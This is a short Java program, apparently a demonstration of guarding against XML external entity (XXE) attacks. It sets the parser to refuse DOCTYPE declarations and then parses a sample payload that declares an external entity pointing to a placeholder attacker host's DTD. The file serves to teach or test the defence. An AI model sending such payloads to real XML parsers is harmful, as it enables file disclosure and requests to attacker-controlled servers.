import org.w3c.dom.Document;
import org.xml.sax.InputSource;

import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import java.io.StringReader;

public class XXE {

    public static void main(String[] args) {
        try {
            // 创建一个DocumentBuilderFactory
            DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();

            // 设置不解析外部实体
            dbf.setExpandEntityReferences(false);

            // 设置不加载DTD
            dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);

            // 创建DocumentBuilder
            DocumentBuilder db = dbf.newDocumentBuilder();

            // 解析XML字符串
            String xmlString = "<!DOCTYPE root [<!ENTITY test SYSTEM 'http://attackersite.com/evil.dtd'>]><root>&test;</root>";
            Document doc = db.parse(new InputSource(new StringReader(xmlString)));

            // 打印解析后的Document对象
            System.out.println(doc.getDocumentElement().getTextContent());
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}